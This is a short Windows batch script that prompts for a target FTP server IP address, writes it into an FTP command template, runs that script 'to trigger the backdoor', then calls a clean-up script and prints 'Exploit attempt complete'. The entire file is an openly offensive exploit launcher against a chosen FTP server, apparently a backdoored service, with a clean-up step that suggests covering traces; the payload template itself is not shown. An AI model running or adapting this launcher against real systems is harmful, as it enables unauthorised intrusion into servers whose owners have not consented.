@echo off

REM Ask for the target IP address
set /p ip_address=Enter target FTP server IP address:

REM Replace placeholder in FTP script with the actual IP address
setlocal enabledelayedexpansion
set "ftp_script=scripts/ftp_script.txt"
(for /f "delims=" %%i in (scripts/ftp_script_template.txt) do (
    set "line=%%i"
    echo !line:TARGET_IP=!ip_address!>>!ftp_script!
))

REM Run the FTP script to trigger the backdoor
ftp -s:%ftp_script%

REM Run the clean-up script
call scripts/clean_up.bat

echo Exploit attempt complete. Exiting...
pause
